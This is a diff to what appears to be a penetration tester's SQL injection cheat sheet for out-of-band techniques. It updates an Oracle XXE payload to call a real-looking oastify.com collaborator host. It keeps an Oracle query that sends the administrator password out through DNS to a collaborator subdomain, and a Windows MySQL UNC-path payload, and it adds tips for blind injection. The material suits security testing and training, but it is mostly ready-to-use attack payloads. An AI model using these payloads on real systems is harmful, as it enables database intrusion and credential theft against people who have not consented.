@@ -1,5 +1,7 @@
+THESE ARE NOT SANTIZED AND DO NO INCLUDE COMMENTS AT END. TAILOR TO SINK!
+
 Oracle - Identify
-SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://9t3vla67pj00yls00y724dag67cz04ot.oastify.com/"> %remote;]>'),'/l') FROM dual 
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://v40cc6c1l1eugry22tueybw37udl1bp0.oastify.com"> %remote;]>'),'/l') FROM dual 
 
 Oracle - Extract
 SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
@@ -22,3 +24,8 @@ SELECT f();
 MySQL
 The following technique works on Windows only:
 SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+
+Tips:
+1. Determine DB type, otherwise, very blind
+2. If you're shooting in the dark, make sure to () and  --- and AND/UNION
+
